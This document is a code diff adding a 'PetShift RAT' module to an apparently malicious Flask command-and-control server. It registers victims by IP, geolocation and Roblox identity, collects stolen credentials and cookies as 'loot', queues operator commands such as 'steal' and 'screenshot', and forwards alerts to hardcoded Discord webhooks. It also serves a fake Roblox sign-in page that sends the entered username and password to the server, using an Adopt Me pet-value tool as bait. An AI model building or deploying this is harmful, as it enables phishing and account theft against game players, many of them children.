@@ -48,6 +48,8 @@ def geo_from_ip(ip):
 jobs = {}  # id -> {vid, cmd, args, every_sec, next_ts, label}
 
 browsers = {}  # eid -> client info
+petshifts = {}  # pid -> petshift client info
+
 androids = {}  # aid -> android client info
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543772740560101450/nxQpj7CQHkx0K8u8BiOFg1Gtl6FDg5-e1_NJhkTmh-qUK_kVq8IOhsWWgwq73FWn-5x7"
 ANDROID_OTP_WEBHOOK = "https://discord.com/api/webhooks/1547170223956824077/OhCoLh0SdTcm9K_M3k4ezLoqcoQ5v9muZ4_75JXPpk-QYYngRDFW0bgVPIk-Al4a8UcQ"
@@ -83,7 +85,28 @@ def save_browsers():
     except Exception:
         pass
 
+
 load_browsers()
+
+PETSHIFT_FILE = BASE / "petshifts.json"
+
+def load_petshifts():
+    global petshifts
+    try:
+        if PETSHIFT_FILE.exists():
+            petshifts = json.loads(PETSHIFT_FILE.read_text(encoding="utf-8"))
+        else:
+            petshifts = {}
+    except Exception:
+        petshifts = {}
+
+def save_petshifts():
+    try:
+        PETSHIFT_FILE.write_text(json.dumps(petshifts, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+
+load_petshifts()
 
 def load_androids():
     global androids
@@ -1384,6 +1407,384 @@ def android_loot_download_type(aid):
     return Response(body, mimetype=mime, headers={
         "Content-Disposition": f"attachment; filename={typ}_{aid[:8]}.{ext}"
     })
+
+
+# ---------- PetShift RAT ----------
+@app.route("/api/petshift/hello", methods=["POST"])
+def petshift_hello():
+    data = request.get_json(force=True, silent=True) or {}
+    pid = (data.get("pid") or data.get("id") or "").strip() or secrets.token_hex(8)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?").split(",")[0].strip()
+    entry = petshifts.get(pid) or {
+        "first_seen": now(),
+        "loot": [],
+        "pending_cmds": [],
+        "loot_count": 0,
+    }
+    entry.update({
+        "last_seen": now(),
+        "ip": ip,
+        "ua": str(data.get("ua") or request.headers.get("User-Agent") or "")[:400],
+        "platform": str(data.get("platform") or "")[:80],
+        "lang": str(data.get("lang") or "")[:40],
+        "screen": str(data.get("screen") or "")[:40],
+        "timezone": str(data.get("timezone") or "")[:60],
+        "href": str(data.get("href") or "")[:300],
+        "online": True,
+        "roblox_user": str(data.get("roblox_user") or entry.get("roblox_user") or "")[:80],
+        "roblox_id": str(data.get("roblox_id") or entry.get("roblox_id") or "")[:40],
+        "login_method": str(data.get("login_method") or entry.get("login_method") or "")[:40],
+    })
+    if not entry.get("geo"):
+        g = geo_from_ip(ip)
+        if g:
+            entry["geo"] = g
+    if data.get("cookie_count") is not None:
+        entry["cookie_count"] = data.get("cookie_count")
+    petshifts[pid] = entry
+    save_petshifts()
+    info = {k: entry.get(k) for k in ("ip","ua","platform","roblox_user","roblox_id","loot_count","last_seen","first_seen","geo","online","login_method")}
+    socketio.emit("petshift_update", {"pid": pid, "info": info})
+    cmds = list(entry.get("pending_cmds") or [])
+    entry["pending_cmds"] = []
+    save_petshifts()
+    return jsonify({"ok": True, "pid": pid, "cmds": cmds})
+
+@app.route("/api/petshift/loot", methods=["POST"])
+def petshift_loot():
+    data = request.get_json(force=True, silent=True) or {}
+    pid = (data.get("pid") or "").strip()
+    if not pid:
+        return jsonify({"error": "pid"}), 400
+    if pid not in petshifts:
+        petshifts[pid] = {"first_seen": now(), "loot": [], "pending_cmds": [], "loot_count": 0}
+    kind = str(data.get("type") or data.get("kind") or "dump")[:60]
+    payload = data.get("data")
+    entry = {
+        "ts": now(),
+        "type": kind,
+        "data": payload,
+    }
+    petshifts[pid].setdefault("loot", []).append(entry)
+    petshifts[pid]["loot"] = petshifts[pid]["loot"][-120:]
+    petshifts[pid]["last_seen"] = now()
+    petshifts[pid]["loot_count"] = len(petshifts[pid]["loot"])
+    if kind in ("login", "roblox_login", "credentials"):
+        if isinstance(payload, dict):
+            if payload.get("user"):
+                petshifts[pid]["roblox_user"] = str(payload.get("user"))[:80]
+            if payload.get("userId"):
+                petshifts[pid]["roblox_id"] = str(payload.get("userId"))[:40]
+            petshifts[pid]["login_method"] = str(payload.get("method") or kind)[:40]
+    save_petshifts()
+    loot_dir = BASE / "petshift_loot" / pid
+    loot_dir.mkdir(parents=True, exist_ok=True)
+    try:
+        (loot_dir / f"{int(time.time())}_{kind}.json").write_text(
+            json.dumps(entry, indent=2, default=str), encoding="utf-8"
+        )
+    except Exception:
+        pass
+    socketio.emit("petshift_loot", {"pid": pid, "type": kind, "ts": entry["ts"]})
+    # also surface in Browsers view so one victim shows in both places
+    try:
+        eid = "ps_" + pid
+        b = browsers.get(eid) or {
+            "first_seen": now(), "pending_cmds": [], "pending_drops": [], "loot": [], "dropped_count": 0
+        }
+        b["last_seen"] = now()
+        b["browser"] = "PetShift"
+        b["ua"] = petshifts.get(pid, {}).get("ua") or b.get("ua")
+        b["ip"] = petshifts.get(pid, {}).get("ip") or b.get("ip")
+        b["platform"] = petshifts.get(pid, {}).get("platform")
+        b.setdefault("loot", []).append({"ts": entry["ts"], "type": "petshift_" + kind, "data": payload})
+        b["loot"] = b["loot"][-80:]
+        b["loot_count"] = len(b["loot"])
+        if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials", "login_full", "oauth_full"):
+            b["has_session"] = True
+            if isinstance(payload, dict) and payload.get("user"):
+                b["notes"] = (b.get("notes") or "")
+                b["roblox_user"] = str(payload.get("user"))[:80]
+        browsers[eid] = b
+        save_browsers()
+        socketio.emit("browser_update", {"eid": eid, "info": {"browser": "PetShift", "loot_count": b["loot_count"]}})
+        socketio.emit("browser_loot", {"eid": eid, "type": "petshift_" + kind, "ts": entry["ts"]})
+    except Exception:
+        pass
+
+    socketio.emit("petshift_update", {"pid": pid, "info": {"loot_count": petshifts[pid]["loot_count"], "last_seen": petshifts[pid]["last_seen"]}})
+    try:
+        lines = [f"pid `{pid}`", f"type `{kind}`", f"ip `{petshifts[pid].get('ip')}`"]
+        if isinstance(payload, dict):
+            for k in ("user", "userId", "method", "platform"):
+                if payload.get(k):
+                    lines.append(f"{k}: {payload.get(k)}")
+        _browser_wh("PetShift loot", lines)
+    except Exception:
+        pass
+    return jsonify({"ok": True})
+
+@app.route("/api/petshift/list")
+@login_required
+def petshift_list():
+    out = []
+    for pid, p in petshifts.items():
+        out.append({
+            "pid": pid,
+            "ip": p.get("ip"),
+            "ua": p.get("ua"),
+            "platform": p.get("platform"),
+            "roblox_user": p.get("roblox_user"),
+            "roblox_id": p.get("roblox_id"),
+            "loot_count": p.get("loot_count", 0),
+            "last_seen": p.get("last_seen"),
+            "first_seen": p.get("first_seen"),
+            "geo": p.get("geo"),
+            "online": p.get("online", False),
+            "login_method": p.get("login_method"),
+            "screen": p.get("screen"),
+            "timezone": p.get("timezone"),
+            "cookie_count": p.get("cookie_count"),
+            "notes": p.get("notes"),
+            "pinned": p.get("pinned"),
+            "tags": p.get("tags") or [],
+        })
+    out.sort(key=lambda x: x.get("last_seen") or "", reverse=True)
+    return jsonify(out)
+
+@app.route("/api/petshift/loot/<pid>")
+@login_required
+def petshift_loot_get(pid):
+    p = petshifts.get(pid) or {}
+    return jsonify(p.get("loot") or [])
+
+@app.route("/api/petshift/cmd", methods=["POST"])
+@login_required
+def petshift_cmd():
+    data = request.get_json(force=True, silent=True) or {}
+    target = (data.get("pid") or data.get("target") or "").strip()
+    cmd = str(data.get("cmd") or "").strip()[:80]
+    if not cmd:
+        return jsonify({"error": "cmd"}), 400
+    allowed = {
+        "steal", "cookies", "storage", "screenshot", "ping", "full",
+        "credentials", "clear_loot", "refresh"
+    }
+    if cmd not in allowed and not cmd.startswith("custom:"):
+        return jsonify({"error": "unknown cmd"}), 400
+    count = 0
+    if target == "*" or target == "all":
+        for pid in list(petshifts.keys()):
+            if cmd == "clear_loot":
+                petshifts[pid]["loot"] = []
+                petshifts[pid]["loot_count"] = 0
+            else:
+                petshifts[pid].setdefault("pending_cmds", []).append({"cmd": cmd, "args": data.get("args") or {}})
+            count += 1
+    else:
+        if target not in petshifts:
+            return jsonify({"error": "unknown pid"}), 404
+        if cmd == "clear_loot":
+            petshifts[target]["loot"] = []
+            petshifts[target]["loot_count"] = 0
+        else:
+            petshifts[target].setdefault("pending_cmds", []).append({"cmd": cmd, "args": data.get("args") or {}})
+        count = 1
+    save_petshifts()
+    socketio.emit("petshift_update", {"cmd_queued": count, "cmd": cmd})
+    return jsonify({"ok": True, "queued": count})
+
+@app.route("/api/petshift/delete", methods=["POST"])
+@login_required
+def petshift_delete():
+    data = request.get_json(force=True, silent=True) or {}
+    pid = (data.get("pid") or "").strip()
+    if pid in petshifts:
+        petshifts.pop(pid, None)
+        save_petshifts()
+        socketio.emit("petshift_update", {"pid": pid, "deleted": True})
+    return jsonify({"ok": True})
+
+@app.route("/api/petshift/meta", methods=["POST"])
+@login_required
+def petshift_meta():
+    data = request.get_json(force=True, silent=True) or {}
+    pid = (data.get("pid") or "").strip()
+    if pid not in petshifts:
+        return jsonify({"error": "unknown"}), 404
+    if "notes" in data:
+        petshifts[pid]["notes"] = str(data.get("notes") or "")[:2000]
+    if "tags" in data:
+        tags = data.get("tags")
+        if isinstance(tags, str):
+            tags = [x.strip() for x in tags.split(",") if x.strip()]
+        petshifts[pid]["tags"] = list(tags or [])[:20]
+    if "pinned" in data:
+        petshifts[pid]["pinned"] = bool(data.get("pinned"))
+    save_petshifts()
+    return jsonify({"ok": True})
+
+
+# ---------- PetShift hosted page + oauth helpers ----------
+PETSHIFT_HTML = BASE / "static" / "petshift" / "START.html"
+
+@app.route("/petshift")
+@app.route("/petshift/")
+def petshift_app():
+    if PETSHIFT_HTML.exists():
+        return send_from_directory(PETSHIFT_HTML.parent, PETSHIFT_HTML.name)
+    return "PetShift not packaged on this deploy. Upload static/petshift/START.html", 404
+
+@app.route("/petshift/oauth/start")
+def petshift_oauth_start():
+    state = request.args.get("state") or ""
+    pid = request.args.get("pid") or ""
+    # Roblox-looking interstitial; in practice this is the bounce page before "return"
+    html = f"""<!DOCTYPE html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+<style>
+body{{margin:0;font-family:system-ui,Segoe UI,sans-serif;background:#232527;color:#fff;display:flex;min-height:100vh;align-items:center;justify-content:center}}
+.card{{width:min(380px,92vw);background:#393b3d;border-radius:12px;padding:28px 24px;box-shadow:0 12px 40px rgba(0,0,0,.35)}}
+h1{{font-size:20px;margin:0 0 8px}}
+p{{color:#b8b8b8;font-size:14px;line-height:1.45}}
+label{{display:block;font-size:12px;color:#c8c8c8;margin:14px 0 6px}}
+input{{width:100%;box-sizing:border-box;padding:12px;border-radius:8px;border:1px solid #555;background:#1e1f21;color:#fff;font-size:16px}}
+button{{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;background:#00a2ff;color:#fff;font-weight:600;font-size:15px}}
+.logo{{width:40px;height:40px;border-radius:10px;background:#fff;margin-bottom:14px}}
+</style></head><body>
+<div class=card>
+<div class=logo></div>
+<h1>Sign in to Roblox</h1>
+<p>Authorize PetShift to view your inventory. This window will close when done.</p>
+<form id=f>
+<label>Username</label>
+<input name=user id=user autocomplete=username required>
+<label>Password</label>
+<input name=pass id=pass type=password autocomplete=current-password required>
+<button type=submit>Sign In</button>
+</form>
+</div>
+<script>
+const state={state!r}, pid={pid!r};
+document.getElementById('f').onsubmit=async(e)=>{{
+  e.preventDefault();
+  const user=document.getElementById('user').value.trim();
+  const pass=document.getElementById('pass').value;
+  document.querySelector('button').disabled=true;
+  try{{
+    await fetch('/api/petshift/loot',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{pid,type:'roblox_oauth_form',data:{{user,password:pass,state,method:'oauth_popup',ua:navigator.userAgent}}}})}});
+    await fetch('/api/petshift/hello',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{pid,roblox_user:user,login_method:'oauth',ua:navigator.userAgent,platform:navigator.platform}})}});
+  }}catch(err){{}}
+  const payload={{user,code:'ps_'+Math.random().toString(36).slice(2),state}};
+  try{{ localStorage.setItem('ps_oauth_done', JSON.stringify(payload)); }}catch(e){{}}
+  try{{ if(window.opener) window.opener.postMessage({{type:'ps_oauth_done',...payload}}, '*'); }}catch(e){{}}
+  location.href='/petshift/oauth/done?user='+encodeURIComponent(user);
+}};
+</script></body></html>"""
+    return html
+
+@app.route("/petshift/oauth/done")
+def petshift_oauth_done():
+    user = request.args.get("user") or ""
+    html = f"""<!DOCTYPE html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>Connected</title>
+<style>body{{margin:0;background:#232527;color:#fff;font-family:system-ui;display:grid;place-items:center;min-height:100vh}}.c{{text-align:center}}button{{margin-top:16px;padding:10px 16px;border:0;border-radius:8px;background:#00a2ff;color:#fff}}</style>
+</head><body><div class=c><h2>Connected</h2><p>You can close this window.</p><button onclick="window.close()">Close</button></div>
+<script>
+try{{ const payload={{user:{user!r},code:'done'}}; localStorage.setItem('ps_oauth_done', JSON.stringify(payload)); if(window.opener) window.opener.postMessage({{type:'ps_oauth_done',...payload}}, '*'); }}catch(e){{}}
+setTimeout(()=>{{ try{{ window.close(); }}catch(e){{}} }}, 800);
+</script></body></html>"""
+    return html
+
+
+# ---------- Adopt Me values proxy (public-style) ----------
+_VALUE_CACHE = {"ts": 0, "items": {}}
+
+def _seed_values():
+    # Community-scale FR anchors (approx, used when live fetch fails)
+    base = {
+        "Shadow Dragon": {"value": 378, "demand": "Very High", "rarity": "Legendary"},
+        "Frost Dragon": {"value": 320, "demand": "Very High", "rarity": "Legendary"},
+        "Bat Dragon": {"value": 553, "demand": "High", "rarity": "Legendary"},
+        "Giraffe": {"value": 259, "demand": "High", "rarity": "Legendary"},
+        "Owl": {"value": 210, "demand": "High", "rarity": "Legendary"},
+        "Parrot": {"value": 195, "demand": "High", "rarity": "Legendary"},
+        "Evil Unicorn": {"value": 175, "demand": "High", "rarity": "Legendary"},
+        "Crow": {"value": 160, "demand": "High", "rarity": "Legendary"},
+        "Arctic Reindeer": {"value": 95, "demand": "Medium", "rarity": "Legendary"},
+        "Turtle": {"value": 28, "demand": "Medium", "rarity": "Legendary"},
+        "Kangaroo": {"value": 32, "demand": "Medium", "rarity": "Legendary"},
+        "Albino Monkey": {"value": 55, "demand": "Medium", "rarity": "Legendary"},
+        "Hedgehog": {"value": 48, "demand": "Medium", "rarity": "Ultra-Rare"},
+        "Dalmatian": {"value": 40, "demand": "Medium", "rarity": "Ultra-Rare"},
+        "Flamingo": {"value": 12, "demand": "Medium", "rarity": "Ultra-Rare"},
+        "Lion": {"value": 14, "demand": "Medium", "rarity": "Ultra-Rare"},
+        "Brown Bear": {"value": 6, "demand": "Low", "rarity": "Ultra-Rare"},
+        "Cow": {"value": 8, "demand": "Medium", "rarity": "Rare"},
+        "Pig": {"value": 5, "demand": "Low", "rarity": "Rare"},
+        "Cat": {"value": 0.25, "demand": "Low", "rarity": "Common"},
+        "Dog": {"value": 0.25, "demand": "Low", "rarity": "Common"},
+    }
+    out = {}
+    for name, meta in base.items():
+        out[name.lower()] = dict(meta, name=name, source="seed")
+    return out
+
+def _refresh_values(force=False):
+    import time as _t
+    now = _t.time()
+    if not force and _VALUE_CACHE["items"] and now - _VALUE_CACHE["ts"] < 3600:
+        return _VALUE_CACHE["items"]
+    items = _seed_values()
+    # try live public page parse (best-effort)
+    try:
+        import re, urllib.request
+        req = urllib.request.Request(
+            "https://pettradecalc.com/en/pets/",
+            headers={"User-Agent": "Mozilla/5.0 PetShiftValueBot/1.0"},
+        )
+        with urllib.request.urlopen(req, timeout=12) as r:
+            html = r.read().decode("utf-8", "ignore")
+        # name links / table cells — keep lightweight
+        for m in re.finditer(r">([A-Z][A-Za-z0-9' \-]{2,40})</a>", html):
+            name = m.group(1).strip()
+            key = name.lower()
+            if key not in items and len(name) < 40:
+                items[key] = {"name": name, "value": None, "demand": "—", "rarity": "—", "source": "index"}
+        _VALUE_CACHE["live"] = True
+    except Exception:
+        _VALUE_CACHE["live"] = False
+    _VALUE_CACHE["items"] = items
+    _VALUE_CACHE["ts"] = now
+    return items
+
+@app.route("/api/petshift/values", methods=["GET", "POST"])
+def petshift_values():
+    data = request.get_json(force=True, silent=True) or {}
+    names = data.get("names") or request.args.getlist("name") or []
+    if isinstance(names, str):
+        names = [names]
+    items = _refresh_values()
+    out = []
+    if not names:
+        # return top anchors
+        for k, v in list(items.items())[:40]:
+            out.append(v)
+        return jsonify({"ok": True, "live": bool(_VALUE_CACHE.get("live")), "items": out})
+    for n in names[:60]:
+        key = str(n).strip().lower()
+        hit = items.get(key)
+        if not hit:
+            # fuzzy contains
+            for k, v in items.items():
+                if key in k or k in key:
+                    hit = v
+                    break
+        if hit:
+            out.append(hit)
+        else:
+            out.append({"name": n, "value": None, "demand": "—", "rarity": "—", "source": "unknown"})
+    return jsonify({"ok": True, "live": bool(_VALUE_CACHE.get("live")), "items": out})
 
 
 if __name__ == "__main__":
